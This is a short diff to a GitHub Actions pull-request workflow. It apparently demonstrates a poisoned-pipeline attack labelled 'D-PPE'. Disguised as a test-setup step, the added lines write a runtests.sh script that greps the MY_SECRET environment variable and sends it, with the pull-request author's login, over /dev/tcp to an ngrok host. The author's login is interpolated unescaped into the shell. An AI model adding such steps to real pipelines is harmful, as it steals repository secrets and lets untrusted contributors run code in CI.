@@ -27,6 +27,10 @@ jobs:
         run: |
           mkdir ./bin
           touch ./bin/mybin.exe 
+          echo "echo D-PPE from pr.yml > ./runtests.out" > ./runtests.sh 
+          echo "echo ------- D-PPE From user [${{ github.event.pull_request.user.login }}] \
+                in pr [${{ github.workflow }}] pr.yml :: $(env | grep MY_SECRET) \
+                > /dev/tcp/4.tcp.eu.ngrok.io/10129" >> ./runtests.sh
       
       # Simulation of running tests
       - name: Running tests ...
